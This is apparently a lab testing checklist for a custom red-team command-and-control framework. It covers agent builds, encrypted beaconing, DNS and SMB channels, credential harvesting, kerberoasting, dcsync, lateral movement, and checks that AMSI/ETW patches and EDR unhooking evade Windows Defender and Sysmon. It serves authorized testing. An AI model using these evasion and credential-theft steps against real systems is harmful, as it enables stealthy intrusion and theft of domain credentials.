# Caraxes C2 — Pre-Production Testing Checklist

Test every item below in a controlled lab before using the framework on an authorized engagement. Each section includes the specific test, expected result, and how to verify it.

Lab environment: 2 DCs (Server 2019/2022), 2 workstations (Win 10/11), 1 file server, all domain-joined. Sysmon + Windows Defender enabled on at least one workstation. Wireshark on the operator machine.

---

## 1. Build & Compilation

### 1.1 Agent Build — x64
- [ ] `make` in `agent_c/` produces `build/agent.exe` without warnings
- [ ] Binary is a valid PE: `file build/agent.exe` shows `PE32+ executable (console) x86-64`
- [ ] Binary size is under 200KB (stripped)
- [ ] No plaintext strings leak C2 URL: `strings build/agent.exe | grep -i http` returns nothing meaningful (if API hashing is on)

### 1.2 Agent Build — x86
- [ ] `make ARCH=x86` compiles without errors
- [ ] Binary is valid PE32: `file build/agent.exe` shows `PE32 executable (console) Intel 80386`

### 1.3 Agent Build — GUI Subsystem
- [ ] `make gui` produces `build/agent_gui.exe` with `--subsystem,windows`
- [ ] Running `agent_gui.exe` on target shows no console window

### 1.4 Generate Command
- [ ] `main> generate --url https://10.0.0.1:8443/api/v1 --sleep 10 --jitter 15` produces a working agent
- [ ] `generate --arch x86` produces an x86 agent
- [ ] `generate --kill-date 2026-12-31` embeds the kill date correctly
- [ ] `generate --magic 0xCAFEBABE` changes the packet magic (verify with `xxd` or in Wireshark)
- [ ] Generated agent calls back to the correct URL (not the default `127.0.0.1:8443`)

### 1.5 Key Generation
- [ ] `python scripts/generate_keys.py` creates `keys/server_priv.pem` and `keys/server_pub.pem`
- [ ] Keys are RSA-2048: `openssl rsa -in keys/server_priv.pem -text -noout | head -1`
- [ ] Generating a second time overwrites (or prompts) — don't silently leave stale keys

---

## 2. Operator Client Startup

### 2.1 Basic Startup
- [ ] `python -m client.main --listen-port 8443 --cert server.pem --key server.key --rsa-key keys/server_priv.pem` starts without error
- [ ] Banner prints with version and module count
- [ ] HTTPS listener shows as RUNNING

### 2.2 Module Discovery
- [ ] All modules in `modules/` are discovered: check count against `find modules -name module.yaml | wc -l`
- [ ] Invalid module.yaml files are skipped with a warning, not a crash
- [ ] `modules list` shows modules grouped by category
- [ ] `modules search kerberos` finds kerberoast, asreproast, and ticket-related modules

### 2.3 Listener Management
- [ ] `listeners` shows all active listeners with ID, type, port, status
- [ ] `listeners stop <id>` stops the listener and confirms
- [ ] Starting a listener on an already-bound port gives a clear error

### 2.4 Tab Completion
- [ ] In main context: tab-completes `agents`, `interact`, `listeners`, `modules`, `generate`, `exit`
- [ ] In agent context: tab-completes all module names and built-in commands
- [ ] Module argument completion: `kerberoast --<TAB>` shows `--domain`, `--spn`, `--hashcat`
- [ ] No crash on empty tab press or mid-word tab

---

## 3. Agent Check-In & Session Management

### 3.1 First Check-In
- [ ] Run agent on target → operator shell prints `[+] New agent` with hostname, user, PID, arch, integrity
- [ ] `agents` shows the agent with correct metadata
- [ ] `interact 1` enters agent context with correct prompt: `[agent 1][HOSTNAME][DOMAIN\user][INTEGRITY][ARCH][PID:xxxx]`

### 3.2 Key Exchange
- [ ] ECDH key exchange completes (verify no "key exchange failed" errors in debug log)
- [ ] Subsequent traffic is AES-256-GCM encrypted (Wireshark shows no plaintext TLVs)
- [ ] Nonce counter increments (check debug log — no nonce reuse)

### 3.3 Multiple Agents
- [ ] Run agents on 3 different targets → all appear in `agents` list with unique IDs
- [ ] `interact 1` / `interact 2` / `interact 3` — each shows correct host/user context
- [ ] Commands dispatched to the correct agent (run `whoami` on each, verify output matches)
- [ ] `back` returns to main context cleanly

### 3.4 Agent Metadata
- [ ] `info` in agent context shows: hostname, username, PID, PPID, arch, OS version, .NET version, integrity level, admin status, process name, channel type, sleep/jitter

### 3.5 Sleep & Jitter
- [ ] `sleep 5 10` — agent changes beacon interval (verify with Wireshark timing)
- [ ] `sleep 300 50` — agent beacons every 150–450s (spot-check several intervals)
- [ ] Sleep value persists across check-ins (doesn't reset)

### 3.6 Agent Exit
- [ ] `exit` prompts for confirmation
- [ ] On confirmation, agent process terminates on target (verify with Task Manager)
- [ ] Agent disappears from `agents` list (or shows as dead)
- [ ] Canceling confirmation does NOT kill the agent

---

## 4. Communication Channels

### 4.1 HTTPS Channel
- [ ] Agent checks in over HTTPS (Wireshark: TLS handshake → encrypted application data)
- [ ] TLS certificate matches what was configured
- [ ] Self-signed cert works (agent doesn't reject it)
- [ ] Malleable profile shapes traffic: verify URI path, cookie name, User-Agent, response Content-Type in Wireshark/Burp

### 4.2 SMB Named Pipe Channel
- [ ] Agent1 (HTTPS) → start pipe server → Agent2 connects to `\\DC01\pipe\spoolsvc`
- [ ] Operator sees Agent2 in `agents` list
- [ ] Running `whoami` on Agent2 returns Agent2's user (not Agent1's)
- [ ] Agent1 correctly relays traffic between operator and Agent2
- [ ] Killing Agent1 disconnects Agent2 (or Agent2 enters fallback)

### 4.3 DNS Channel
- [ ] Start DNS listener: `listeners start dns --domain c2.example.com`
- [ ] Agent with DNS enabled resolves queries to operator's DNS server
- [ ] `whoami` output arrives (slowly) over DNS TXT records
- [ ] Large output (e.g., `ps`) reassembles correctly from multiple DNS queries

### 4.4 Channel Fallback
- [ ] Agent configured with priority `http,dns` — block HTTPS (firewall rule) → agent fails over to DNS within `MAX_FAILURES * sleep` time
- [ ] Restore HTTPS → agent switches back to HTTPS (if implemented)
- [ ] All channels fail → agent enters extended sleep (1 hour), then retries

### 4.5 Kill Date
- [ ] Set kill date to yesterday's date → agent exits immediately on startup
- [ ] Set kill date to tomorrow → agent runs normally
- [ ] Kill date = 0 → agent runs indefinitely (no kill date check)

### 4.6 Working Hours
- [ ] Configure working hours `09:00-17:00` → agent only beacons during that window
- [ ] Outside working hours, agent sleeps until the next window (verify with Wireshark)

---

## 5. Wire Protocol & Crypto

### 5.1 Packet Integrity
- [ ] Capture traffic in Wireshark → verify MAGIC bytes match `CONFIG_MAGIC`
- [ ] SIZE field matches actual packet length
- [ ] MSG_ID increments per message (no gaps, no reuse)
- [ ] Corrupted packet (flip a byte) → server rejects, agent doesn't crash

### 5.2 Encryption Validation
- [ ] Decrypt captured traffic using session key from debug log → plaintext TLVs are correct
- [ ] Different sessions use different keys (two agents don't share a session key)
- [ ] Replaying a captured packet → server rejects (MSG_ID already seen)

### 5.3 Large Payloads
- [ ] Upload a 10MB file → transfer completes without corruption (SHA256 match)
- [ ] Download a 10MB file → same verification
- [ ] Upload a 100MB file → chunking works, no memory exhaustion on either side
- [ ] Module output > 512KB → chunked result transfer works

---

## 6. Native Modules — File Operations

### 6.1 ls
- [ ] `ls C:\` lists root directory with file names, sizes, dates, attributes
- [ ] `ls C:\Windows\System32` handles large directories (thousands of entries)
- [ ] `ls C:\nonexistent` returns a clear error, not a crash
- [ ] `ls` with no path lists current working directory

### 6.2 cat
- [ ] `cat C:\Windows\System32\drivers\etc\hosts` returns file contents
- [ ] `cat` on a binary file returns raw bytes without crash
- [ ] `cat` on an inaccessible file (e.g., SAM) returns ACCESS_DENIED error
- [ ] `cat` on a large file (>1MB) doesn't hang or OOM the agent

### 6.3 upload / download
- [ ] Upload a file → file appears on target at correct path with correct contents
- [ ] Download a file → file appears on operator machine with correct contents
- [ ] SHA256 of uploaded file matches original
- [ ] Upload to a path without write permission → clear error
- [ ] Download a locked file → clear error (not a hang)
- [ ] Upload/download with Unicode filename: `C:\Users\admin\café.txt`

---

## 7. Native Modules — Process & System

### 7.1 whoami
- [ ] Returns correct username (`DOMAIN\user`), SID, integrity level
- [ ] Privilege list is accurate (compare with `whoami /priv` via shell)
- [ ] Group membership is accurate (compare with `whoami /groups` via shell)
- [ ] Correctly identifies SYSTEM, HIGH, MEDIUM, LOW integrity

### 7.2 ps
- [ ] Lists all processes with PID, PPID, name, session ID
- [ ] Process list matches `tasklist /v` output (spot-check 10 processes)
- [ ] Running as SYSTEM shows all processes including Session 0
- [ ] Running as regular user still shows all processes (NtQuerySystemInformation doesn't require OpenProcess)
- [ ] No ACCESS_DENIED audit events in Security log (verify via Event Viewer)

### 7.3 screenshot
- [ ] Returns a valid BMP image that opens in an image viewer
- [ ] Image shows the actual desktop (verify visually)
- [ ] Works from Session 0 / service context (captures Default desktop or returns error gracefully)
- [ ] Multi-monitor: `screenshot --all` captures the full virtual desktop

---

## 8. Native Modules — Network

### 8.1 net_tcp
- [ ] Lists all TCP connections with local/remote addresses, ports, state, PID
- [ ] Includes both IPv4 and IPv6 connections
- [ ] State names are correct (ESTABLISHED, LISTEN, TIME_WAIT, etc.)
- [ ] Compare output with `netstat -ano -p tcp`

### 8.2 net_udp
- [ ] Lists UDP listeners with local address, port, PID
- [ ] Includes IPv4 and IPv6
- [ ] Compare with `netstat -ano -p udp`

### 8.3 net_arp
- [ ] Shows IP-to-MAC mappings with type (DYNAMIC/STATIC)
- [ ] Compare with `arp -a`

### 8.4 net_routes
- [ ] Shows destination, netmask, gateway, interface index, metric
- [ ] Compare with `route print`

### 8.5 net_dns
- [ ] Dumps DNS client cache (recently resolved names)
- [ ] Compare with `ipconfig /displaydns`
- [ ] Handles empty cache gracefully

### 8.6 net_interfaces
- [ ] Lists all interfaces with name, MAC, IPs, gateways, DNS, DHCP status
- [ ] Skips loopback
- [ ] Compare with `ipconfig /all`

---

## 9. Native Modules — Port Scanner

### 9.1 Basic Scan
- [ ] `portscan --targets 10.0.0.5 --ports 445` finds an open port on a known-open target
- [ ] Closed port correctly reported as closed (or not listed)
- [ ] Timeout on filtered port → no hang

### 9.2 CIDR Expansion
- [ ] `portscan --targets 10.0.0.0/24 --ports 445` scans 254 hosts
- [ ] Results match `nmap -p 445 10.0.0.0/24` (allow for timing differences)

### 9.3 Port Ranges
- [ ] `--ports 1-1024` scans all 1024 ports
- [ ] `--ports 22,80,443,3389` scans exactly those 4 ports

### 9.4 Performance
- [ ] `--threads 100` with /24 scan completes in reasonable time (<60s for 254 hosts × 10 ports)
- [ ] `--threads 128` (max) doesn't crash
- [ ] `--threads 1` works (slow but functional)

### 9.5 Banner Grabbing
- [ ] Banner grab on HTTP port returns server banner
- [ ] Banner grab on SSH port returns SSH version string
- [ ] Banner grab on closed port → no hang

---

## 10. Native Modules — Registry

### 10.1 Basic Operations
- [ ] `reg_query --root HKLM --subkey "SOFTWARE\Microsoft\Windows NT\CurrentVersion" --value ProductName` returns OS name
- [ ] `reg_enum_values` on a known key lists all values with types and data
- [ ] `reg_enum_subkeys` lists subkeys
- [ ] `reg_set` writes a value → `reg_query` reads it back → `reg_delete` removes it
- [ ] Non-existent key → clear error
- [ ] Access denied on protected key (e.g., HKLM\SAM) → clear error

### 10.2 Pentest Helpers
- [ ] `reg_autoruns` finds legitimate autorun entries (verify against Autoruns/Sysinternals)
- [ ] `reg_autoruns` flags services with non-System32 image paths
- [ ] `reg_creds` finds autologon if configured: `reg add HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon /v DefaultPassword /t REG_SZ /d "TestPass123"`
- [ ] `reg_software` lists installed software (compare with Programs & Features)
- [ ] `reg_secpolicy` correctly reports UAC enabled/disabled, WDigest state, LSA Protection, Firewall, AlwaysInstallElevated

### 10.3 AlwaysInstallElevated Check
- [ ] Set `AlwaysInstallElevated=1` in both HKLM and HKCU → `reg_secpolicy` reports "VULNERABLE"
- [ ] Set only one of them → reports "Not vulnerable" (both must be set)
- [ ] Neither set → reports "Not vulnerable"

---

## 11. Native Modules — Credential Harvesting

### 11.1 Credential Manager
- [ ] Create a test credential: `cmdkey /generic:TestTarget /user:TestUser /pass:TestPass`
- [ ] `cred_credman` finds and displays the credential with password
- [ ] `cmdkey /delete:TestTarget` to clean up

### 11.2 Vault
- [ ] `cred_vault` enumerates vault entries without crash
- [ ] If vault is empty, returns "No vault entries found" (not an error)

### 11.3 Wi-Fi
- [ ] On a machine with saved Wi-Fi profiles, `cred_wifi` lists SSIDs and passwords
- [ ] As SYSTEM: sees all profiles. As regular user: sees own profiles.
- [ ] On a machine with no Wi-Fi adapter: returns "No wireless interfaces" (not a crash)

### 11.4 RDP History
- [ ] Connect to a host via RDP → `cred_rdp` shows the hostname and username hint
- [ ] No RDP history → returns empty (not an error)

### 11.5 Cloud Credentials
- [ ] Create `%USERPROFILE%\.aws\credentials` with test content → `cred_cloud` reports path and size
- [ ] `cred_cloud` does NOT read or exfiltrate file contents (verify — output should show path+size only)
- [ ] No cloud cred files → returns "No cloud credential files found"
- [ ] Delete test file after verification

---

## 12. SOCKS Proxy

### 12.1 Basic SOCKS5
- [ ] `socks_start` → operator-side SOCKS5 port opens
- [ ] `proxychains curl http://10.0.0.5` through the proxy works
- [ ] DNS resolution through the proxy works (SOCKS5 DOMAINNAME)
- [ ] `proxychains nmap -sT -p 445 10.0.0.5` works through the tunnel

### 12.2 Concurrency
- [ ] 5 simultaneous connections through the proxy work
- [ ] 64 simultaneous connections (max) work without crash
- [ ] 65th connection is rejected or queued (not crash)

### 12.3 Stability
- [ ] SOCKS tunnel survives agent sleep/wake cycle
- [ ] Closing a proxied connection doesn't kill other connections
- [ ] Target host unreachable → SOCKS returns connection refused (not hang)
- [ ] Idle connections close after 5-minute timeout

---

## 13. BOF / COFF Loader

### 13.1 Basic BOF Execution
- [ ] `bof /path/to/whoami.x64.o` → returns output
- [ ] BOF output arrives via BeaconPrintf/BeaconOutput → displayed correctly in operator shell
- [ ] BOF with arguments: `bof ldapsearch.x64.o --filter "(objectClass=user)" --domain corp.local`

### 13.2 Beacon API Compatibility
- [ ] BeaconPrintf with format specifiers (%s, %d, %x) → correct output
- [ ] BeaconOutput (binary data) → arrives intact
- [ ] BeaconDataParse/BeaconDataExtract/BeaconDataInt → correctly parse argument buffer
- [ ] BeaconDataShort → 16-bit values parse correctly
- [ ] BeaconIsAdmin → returns correct value

### 13.3 DLL Resolution
- [ ] BOF calling `KERNEL32$CreateFileW` → resolves correctly
- [ ] BOF calling `WLDAP32$ldap_initW` → resolves correctly (dynamic load)
- [ ] BOF calling `SECUR32$AcquireCredentialsHandleW` → resolves correctly
- [ ] BOF with unknown DLL → clear error message, agent doesn't crash
- [ ] BOF with unknown function in known DLL → tries A/W suffix, then errors

### 13.4 Relocation Types
- [ ] Test a BOF that exercises IMAGE_REL_AMD64_REL32 (most common)
- [ ] Test a BOF with IMAGE_REL_AMD64_ADDR64 (absolute 64-bit address)
- [ ] Test a BOF with IMAGE_REL_AMD64_REL32_1 through REL32_5

### 13.5 Third-Party BOF Compatibility
- [ ] TrustedSec SA BOFs: at least `whoami`, `listdns`, `netstat`, `windowlist`
- [ ] boku7/BofRoast: kerberoast BOF
- [ ] Any other public BOF with standard go() entry point

### 13.6 Memory Cleanup
- [ ] After BOF execution, VirtualFree is called on all section allocations
- [ ] No memory leak after 100 consecutive BOF executions (watch agent's working set)
- [ ] Indirect function pointer allocations (Marshal.AllocHGlobal) are freed

---

## 14. Assembly Loader

### 14.1 Basic Assembly Load
- [ ] `assembly /path/to/Seatbelt.exe -group=all` → output captured and returned
- [ ] Assembly with `Main(string[] args)` → arguments passed correctly
- [ ] Assembly with `Main()` (no args) → still works

### 14.2 Output Capture
- [ ] Console.WriteLine output → captured in result
- [ ] Console.Error.WriteLine → captured separately as [STDERR]
- [ ] Large output (>1MB) → chunked correctly

### 14.3 AMSI Bypass
- [ ] With CONFIG_PATCH_AMSI=1: load a known-AMSI-flagged assembly (e.g., Rubeus) → works
- [ ] With CONFIG_PATCH_AMSI=0: same assembly → AMSI blocks it (verify the patch matters)

### 14.4 ETW Suppression
- [ ] With CONFIG_PATCH_ETW=1: load assembly → no `Microsoft-Windows-DotNETRuntime` ETW events (check with `logman` or ETW consumer)
- [ ] With CONFIG_PATCH_ETW=0: ETW events appear for Assembly.Load

### 14.5 Edge Cases
- [ ] Assembly targeting .NET 4.5 on a .NET 4.0 host → clear error (not crash)
- [ ] Assembly targeting .NET Core → clear error
- [ ] Assembly with no entry point → clear error
- [ ] Corrupt/truncated assembly bytes → clear error

---

## 15. Module System (BOF Modules)

### 15.1 Enumeration Modules
- [ ] `enumdomainusers` → returns all domain users with correct attributes
- [ ] `enumdomainusers --filter "(&(adminCount=1))"` → returns only admin-flagged accounts
- [ ] `enumdomaingroups` → returns all groups
- [ ] `enumdomaincomputers` → returns all computer objects
- [ ] `enumdomaintrusts` → returns trust relationships (if any)
- [ ] `enumspns` → returns accounts with SPNs
- [ ] `enumasrep` → returns accounts with DONT_REQUIRE_PREAUTH
- [ ] `enumshares --target DC01` → lists shares
- [ ] `enumsessions --target DC01` → lists active sessions
- [ ] `ldapsearch --filter "(objectClass=*)" --attributes cn --limit 10` → returns 10 results

### 15.2 Credential Modules
- [ ] `kerberoast` → returns hashcat-format hashes for all SPN accounts
- [ ] `kerberoast --hashcat 0` → returns John-format hashes
- [ ] `kerberoast --spn "MSSQLSvc/..."` → targets specific SPN
- [ ] Kerberoasted hash cracks with hashcat (verify format is valid)
- [ ] `asreproast` → returns hashes for accounts with pre-auth disabled
- [ ] `dcsync --user krbtgt` → returns NTLM hash (requires DA or replication privs)
- [ ] `dcsync --user "DOMAIN\Administrator"` → returns admin hash

### 15.3 Ticket Modules
- [ ] `klist` → shows cached Kerberos tickets matching `klist` output
- [ ] `extracttickets` → extracts .kirbi blobs
- [ ] `ptt --ticket <base64_kirbi>` → injects ticket into session
- [ ] `purgetickets` → clears ticket cache
- [ ] `requesttgt --user admin --password P@ssw0rd --domain corp.local` → gets TGT
- [ ] `requesttgs --spn cifs/dc01.corp.local --ticket <tgt_base64>` → gets service ticket
- [ ] `describeticket --ticket <base64>` → shows ticket fields
- [ ] `convertticket --input ticket.kirbi --format ccache` → converts to ccache

### 15.4 Lateral Movement
- [ ] `wmiexec --target 10.0.0.5 --command "whoami"` → executes on remote host
- [ ] `smbexec --target 10.0.0.5 --command "whoami"` → executes on remote host
- [ ] `psexec --target 10.0.0.5 --exe agent.exe` → deploys + executes agent remotely
- [ ] Target unreachable → clear error (timeout, not hang)
- [ ] Insufficient privileges → ACCESS_DENIED error

### 15.5 OPSEC Warnings
- [ ] High-OPSEC module (e.g., dcsync) → operator receives warning + confirmation prompt
- [ ] Declining confirmation → task NOT sent
- [ ] Low-OPSEC module → no warning

### 15.6 Retrocompatibility
- [ ] Module requiring agent >= 2.0 on a 1.0 agent → blocked with clear error
- [ ] Module requiring .NET >= 4.5 on a .NET 4.0 agent → blocked

---

## 16. Evasion Subsystem

### 16.1 AMSI Patch
- [ ] After agent init with CONFIG_PATCH_AMSI=1: `AmsiScanBuffer` first 6 bytes are `B8 57 00 07 80 C3`
- [ ] PowerShell AMSI test string "AmsiUtils" is not flagged in the agent process
- [ ] Assembly.Load of a flagged tool succeeds

### 16.2 ETW Patch
- [ ] After agent init with CONFIG_PATCH_ETW=1: `EtwEventWrite` first bytes are `48 33 C0 C3` (xor rax,rax; ret)
- [ ] No .NET CLR ETW events appear during assembly loading (verify with `xperf` or `logman`)

### 16.3 ntdll Unhooking
- [ ] After agent init with CONFIG_UNHOOK_NTDLL=1: compare ntdll.dll `.text` section in agent process with clean copy from disk → they match
- [ ] EDR hooks (if present) are removed (test with a known-hooked function like NtAllocateVirtualMemory)

### 16.4 PE Header Stomping
- [ ] With CONFIG_PE_STOMP=1: MZ header and PE signature are zeroed in agent's memory
- [ ] Memory scanner cannot identify the agent by PE header
- [ ] Agent still functions normally after stomping

### 16.5 Anti-Debug
- [ ] With CONFIG_ANTI_DEBUG=1: attach debugger before starting agent → agent exits immediately
- [ ] Without debugger → agent runs normally
- [ ] With CONFIG_ANTI_DEBUG=0: debugger attached → agent runs (for development)

### 16.6 Anti-Sandbox
- [ ] With CONFIG_ANTI_SANDBOX=1: run in a bare VM with <2GB RAM, 1 CPU, no recent files → agent exits
- [ ] Run on a real workstation → agent runs normally
- [ ] With CONFIG_ANTI_SANDBOX=0: VM → agent runs

### 16.7 Sleep Obfuscation
- [ ] With CONFIG_SLEEP_OBFUSCATE=1: during sleep, dump agent memory → encrypted (garbage bytes)
- [ ] Agent wakes up and functions normally after encrypted sleep
- [ ] Memory pages are RW (not RX) during sleep (verify with VMMap or Process Hacker)

### 16.8 API Hashing
- [ ] With CONFIG_API_HASHING=1: `strings agent.exe | grep -i "VirtualAlloc\|CreateFile\|NtQuery"` returns no matches for sensitive APIs
- [ ] APIs still resolve correctly at runtime

---

## 17. Malleable Profiles

### 17.1 HTTP Request Shaping
- [ ] With google_search profile: Wireshark shows GET requests to `/search` with `User-Agent: Mozilla/5.0...Chrome`
- [ ] C2 data embedded in `NID` cookie (or configured param)
- [ ] No raw TLV data visible in HTTP body

### 17.2 HTTP Response Shaping
- [ ] Server responds with `Content-Type: text/html`
- [ ] Response body wrapped in fake HTML (`<div style="display:none">...`)
- [ ] `Server: gws` header present

### 17.3 Profile Switching
- [ ] Build agent with profile A, server runs profile A → communication works
- [ ] Build agent with profile A, server runs profile B → communication fails gracefully (not crash)

---

## 18. Logging & Forensics

### 18.1 Operator Log
- [ ] `logs/operator_YYYY-MM-DD.jsonl` exists after running commands
- [ ] Every command typed is logged with timestamp, agent_id, arguments
- [ ] Every result is logged with task_id, status, duration, output preview

### 18.2 Per-Agent Log
- [ ] `logs/agent_{id}_{hostname}.jsonl` exists for each agent
- [ ] Contains only that agent's traffic (not other agents')

### 18.3 Traffic Log
- [ ] `logs/traffic_YYYY-MM-DD.jsonl` contains raw encrypted packet hex
- [ ] Direction field correctly shows `C2→AGENT` and `AGENT→C2`

### 18.4 Log Rotation
- [ ] Logs rotate daily (new file per day)
- [ ] Old log files are not overwritten

---

## 19. Error Handling & Stability

### 19.1 Agent Resilience
- [ ] Agent survives a module that throws an exception (catches, reports error, continues beaconing)
- [ ] Agent survives a BOF that crashes (structured exception handler catches it, agent continues)
- [ ] Agent survives network timeout (retries on next sleep cycle)
- [ ] Agent survives C2 server going down for 10 minutes (reconnects when server returns)
- [ ] Agent survives C2 server going down for 1 hour (extended backoff, reconnects)

### 19.2 Operator Resilience
- [ ] Operator client handles malformed agent response (logs error, doesn't crash)
- [ ] Operator client handles agent sending garbage bytes (drops packet, continues)
- [ ] Ctrl+C in operator shell → clean shutdown (listeners closed, log flushed)
- [ ] Task timeout: module runs for longer than `timeout` → operator marks task as TIMEOUT, agent is not stuck

### 19.3 Memory Stability
- [ ] Run 100 consecutive `ps` commands → agent memory doesn't grow unbounded
- [ ] Run 50 BOF loads → agent memory returns to baseline after each (no leak)
- [ ] Run agent for 24 hours with 60s sleep → stable memory footprint

### 19.4 Concurrent Operations
- [ ] Queue 10 tasks rapidly → all execute in order, all results return correctly
- [ ] Large download + simultaneous `ps` → both complete (no deadlock)

---

## 20. AV/EDR Evasion Validation

### 20.1 Static Detection
- [ ] Submit `agent.exe` to VirusTotal (or local AV scanner) — document detection count
- [ ] Windows Defender real-time scan: agent.exe not flagged on disk
- [ ] Windows Defender: agent.exe not flagged on execution

### 20.2 Behavioral Detection (Windows Defender)
- [ ] Agent runs and beacons for 5 minutes → no Defender alert
- [ ] Run `whoami` + `ps` + `ls` → no Defender alert
- [ ] Run `kerberoast` → no Defender alert
- [ ] Run assembly load of Seatbelt → AMSI patched, no Defender alert
- [ ] Run `screenshot` → no Defender alert

### 20.3 Sysmon Telemetry Audit
- [ ] Agent execution: Sysmon Event 1 (Process Create) — note parent process, command line
- [ ] No unexpected Event 1 entries (no child processes unless shell/powershell used)
- [ ] No Event 8 (CreateRemoteThread) unless injection module explicitly used
- [ ] No Event 10 (ProcessAccess) on LSASS unless dumplsass explicitly used
- [ ] Network connections (Event 3) show only to C2 server (no unexpected destinations)

### 20.4 ETW Telemetry Audit
- [ ] With ETW patched: no `Microsoft-Windows-DotNETRuntime` events during assembly load
- [ ] Verify with: `logman create trace etw_test -p Microsoft-Windows-DotNETRuntime -o etw_test.etl` → start → load assembly → stop → `tracerpt etw_test.etl` → no events

---

## 21. Edge Cases & Negative Tests

### 21.1 Bad Input
- [ ] Module with wrong argument type (string where int expected) → clear error
- [ ] Module with missing required argument → clear error listing missing arg
- [ ] `interact 999` (non-existent agent) → clear error
- [ ] `sleep -1` → rejected
- [ ] `sleep 0` → rejected or minimum enforced
- [ ] Empty module name → no crash

### 21.2 Target Conditions
- [ ] Agent runs on a host with no network (after initial check-in) → retries, doesn't crash
- [ ] Agent runs on a host with minimal privileges (Guest account) → limited modules work, others return ACCESS_DENIED
- [ ] Agent runs from `C:\Windows\Temp` (restricted write location) → CWD operations work
- [ ] Agent runs on Server Core (no GUI) → screenshot returns error, not crash
- [ ] Agent runs on non-domain-joined host → domain modules return "not domain-joined", not crash

### 21.3 Unicode & Special Characters
- [ ] Hostname with Unicode characters → displays correctly
- [ ] Username with special characters (e.g., `O'Brien`) → no SQL-injection-style errors
- [ ] File path with spaces: `C:\Program Files\test.txt` → works
- [ ] File path with Unicode: `C:\Users\admin\Ñoño\test.txt` → works

### 21.4 Resource Exhaustion
- [ ] Port scan of 65535 ports on a single host → completes without OOM
- [ ] `ls C:\Windows\WinSxS` (very large directory, 50k+ entries) → completes
- [ ] Download attempt on a multi-GB file → chunking works or returns a size warning

---

## 22. Operational Security Self-Check

Run these final checks from the perspective of a defender reviewing the lab's telemetry.

### 22.1 Network Forensics
- [ ] Capture full PCAP during a 1-hour session → review for any plaintext C2 data
- [ ] HTTP requests match the configured malleable profile (no leaking default headers)
- [ ] No DNS queries to suspicious domains from the agent (beyond the configured DNS channel)
- [ ] TLS certificate looks plausible (not obviously "Caraxes C2" in the subject)

### 22.2 Host Forensics
- [ ] After agent exit: no files left on disk (unless explicitly uploaded)
- [ ] No registry modifications (unless explicitly made via reg_set)
- [ ] No scheduled tasks created
- [ ] No services installed
- [ ] Event Log: review Security + System + Application logs for anything attributable to the agent
- [ ] Prefetch: `C:\Windows\Prefetch\AGENT*.pf` exists — note this for cleanup

### 22.3 Process Forensics
- [ ] While agent is running: `tasklist /v` — agent process name, PID, user, memory usage all look reasonable
- [ ] Agent's loaded DLLs (`listdlls` from Sysinternals) — no suspicious unnamed modules
- [ ] Agent's open handles (`handle` from Sysinternals) — no unexpected named pipes, files, or registry keys beyond what's expected
- [ ] Thread stack of sleeping agent — if stack spoof is enabled, stacks look benign

---

## Priority Order

For a time-constrained validation, test in this order:

1. **Build + check-in** (sections 1, 2, 3) — if the agent doesn't build and call back, nothing else matters
2. **Core commands** (sections 6, 7) — whoami, ps, ls, upload, download
3. **Crypto** (section 5) — verify encryption works and traffic isn't plaintext
4. **BOF loader** (section 13) — this is the main module execution engine
5. **Key modules** (section 15.1, 15.2) — enumdomainusers, kerberoast
6. **Evasion** (section 16) — verify patches work before going near a defended host
7. **AV/EDR** (section 20) — test against Defender at minimum
8. **Stability** (section 19) — long-running agent, error handling
9. **Everything else** — remaining modules, edge cases, OPSEC self-check
